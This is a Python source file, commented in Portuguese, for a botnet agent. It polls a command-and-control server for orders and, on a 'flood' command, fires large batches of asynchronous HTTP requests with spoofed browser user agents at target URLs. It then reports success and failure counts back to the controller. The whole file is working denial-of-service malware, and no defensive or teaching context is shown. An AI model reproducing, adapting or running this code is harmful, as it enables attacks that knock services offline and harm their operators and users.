import asyncio
import aiohttp
import requests
import uuid
import random

# 1. CONSTANTES (Devem vir logo após os imports)
C2_URL = "http://c2-server:5000"
BOT_ID = f"bot-{uuid.uuid4().hex[:6]}"

# 2. FUNÇÕES DE SUPORTE (Devem vir antes de serem chamadas)

async def send_log(message):
    """Envia logs de progresso para o C2"""
    try:
        # Usamos requests para o log de forma síncrona para simplificar
        requests.post(f"{C2_URL}/report_log", json={"bot_id": BOT_ID, "message": message}, timeout=2)
    except Exception:
        pass

async def attack_task(session, request_config):
    """Realiza uma requisição HTTP assíncrona com método e headers customizados"""
    url = request_config.get("url")
    method = request_config.get("method", "GET").upper()
    body = request_config.get("body")

    headers = {
        "User-Agent": random.choice([
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
        ]),
        "Connection": "keep-alive",
        "Cache-Control": "no-cache"
    }

    custom_headers = request_config.get("headers")
    if custom_headers:
        headers.update(custom_headers)

    try:
        if method == "POST":
            async with session.post(url, headers=headers, data=body, timeout=5) as response:
                return response.status
        elif method == "PUT":
            async with session.put(url, headers=headers, data=body, timeout=5) as response:
                return response.status
        else:
            async with session.get(url, headers=headers, timeout=5) as response:
                return response.status
    except Exception:
        return None

async def flood_target(requests_list, intensity, attack_id):
    """Gerencia o lote de requisições assíncronas com múltiplas URLs/payloads"""
    await send_log(f"INICIANDO ATAQUE (ID: {attack_id}) com {len(requests_list)} requisição(ões) - Intensidade: {intensity}")

    connector = aiohttp.TCPConnector(limit=None)
    async with aiohttp.ClientSession(connector=connector) as session:
        requests_successful = 0
        requests_failed = 0

        for _ in range(intensity):
            tasks = []
            for req_config in requests_list:
                tasks.append(asyncio.create_task(attack_task(session, req_config)))

            if tasks:
                results = await asyncio.gather(*tasks)
                requests_successful += sum(1 for r in results if r and r >= 200 and r < 300)
                requests_failed += sum(1 for r in results if r is None or r >= 400)

        total_requests = len(requests_list) * intensity

        await send_log(f"ATAQUE CONCLUÍDO (ID: {attack_id}) | Total: {total_requests} | Sucesso: {requests_successful} | Falhas: {requests_failed}")

        return {
            "attack_id": attack_id,
            "requests_successful": requests_successful,
            "requests_failed": requests_failed,
            "total_requests": total_requests
        }

# 3. LÓGICA PRINCIPAL (O loop de vida do bot)

async def main():
    print(f"[*] Agente {BOT_ID} online e aguardando ordens...")

    while True:
        try:
            response = requests.get(f"{C2_URL}/get_task/{BOT_ID}", timeout=5)

            if response.status_code == 200:
                order = response.json().get("task")

                if order and order.get("action") == "flood":
                    requests_list = order.get("requests", [])
                    intensity = order.get("intensity", 10)
                    attack_id = order.get("attack_id")

                    if requests_list:
                        result = await flood_target(requests_list, intensity, attack_id)

                        try:
                            requests.post(
                                f"{C2_URL}/report_attack_status",
                                json={
                                    "attack_id": attack_id,
                                    "requests_sent": result["total_requests"],
                                    "requests_successful": result["requests_successful"],
                                    "requests_failed": result["requests_failed"]
                                },
                                timeout=2
                            )
                            requests.post(
                                f"{C2_URL}/finish_attack",
                                json={"attack_id": attack_id},
                                timeout=2
                            )
                        except Exception:
                            pass

                    await asyncio.sleep(0.1)
                else:
                    await asyncio.sleep(3)
            else:
                await asyncio.sleep(3)
        except Exception as e:
            print(f"[!] Erro: {e}")
            await asyncio.sleep(2)


# 4. PONTO DE ENTRADA DO SCRIPT
if __name__ == "__main__":
    asyncio.run(main())